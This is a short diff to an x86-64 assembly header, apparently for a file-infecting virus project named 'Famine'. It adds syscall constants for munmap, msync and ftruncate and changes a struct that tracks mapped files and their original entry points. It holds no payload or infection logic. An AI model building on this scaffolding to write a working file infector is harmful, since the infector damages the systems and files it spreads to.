@@ -3,10 +3,13 @@
 %define SC_CLOSE        3
 %define SC_FSTAT        5
 %define SC_MMAP         9
+%define SC_UNMAP        11
+%define SC_MSYNC        26
 %define SC_EXIT         60
 %define SC_FCHMOD       91
 %define SC_GETDENTS64   217
 %define SC_OPENAT       257
+%define SC_FTRUNCATE    77
 
 ; open
 %define O_RDONLY        0x00000000
@@ -17,6 +20,10 @@
 %define PROT_READ       0x1
 %define PROT_WRITE      0x2
 %define MAP_SHARED      0x02
+
+
+; msync
+%define MS_SYNC 0x0004
 
 ; Para dirent (Regular file)
 %define DT_REG        8
@@ -77,10 +84,11 @@ struc Famine
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
     .file_original_len  resd    1
-    .mmap_pointer       resq    1
+    .mmap_ptr           resq    1
     .original_entry     resq    1
+    .truncate_flag      resb    1
 endstruc
-                        
+
 
 %macro TRACE_TEXT 2
     push rax
